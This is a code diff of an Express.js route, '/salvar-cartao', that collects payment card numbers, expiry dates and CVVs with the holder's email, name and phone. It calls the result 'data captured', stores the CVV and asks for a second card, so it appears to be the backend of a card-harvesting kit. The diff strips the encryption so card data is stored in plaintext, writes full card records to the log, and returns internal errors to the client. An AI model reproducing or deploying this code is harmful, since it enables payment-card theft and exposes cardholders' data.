@@ -1,14 +1,20 @@
 const express = require('express');
 const router = express.Router();
-const Cartao = require('../models/Cartao');
-const { criptografar } = require('../utils/crypto');
+const Cartao = require('./Cartao');
 
 router.post('/salvar-cartao', async (req, res) => {
   try {
     const {
-      email, emailConfirm, nome, celular,
-      numero, validade, cvv, nomeCartao,
-      parcelas, doisCartoes
+      email,
+      emailConfirm,
+      nome,
+      celular,
+      numero,
+      validade,
+      cvv,
+      nomeCartao,
+      parcelas,
+      doisCartoes
     } = req.body;
 
     const novoCartao = new Cartao({
@@ -16,20 +22,21 @@ router.post('/salvar-cartao', async (req, res) => {
       emailConfirm,
       nome,
       celular,
-      numero: criptografar(numero),
-      validade: criptografar(validade),
-      cvv: criptografar(cvv),
+      numero,
+      validade,
+      cvv,
       nomeCartao,
       parcelas,
-      doisCartoes
+      doisCartoes,
+      dataCaptura: new Date()
     });
 
     await novoCartao.save();
-    res.status(200).json({ status: 'ok', msg: 'Dados capturados com sucesso' });
-
+    console.log("🩸 Dado injetado no abismo:", novoCartao);
+    res.json({ status: 'ok' });
   } catch (err) {
-    console.error('Erro ao salvar:', err);
-    res.status(500).json({ status: 'erro', msg: 'Erro interno' });
+    console.error("💀 Erro na salvação:", err);
+    res.status(500).json({ status: 'erro', erro: err });
   }
 });
 
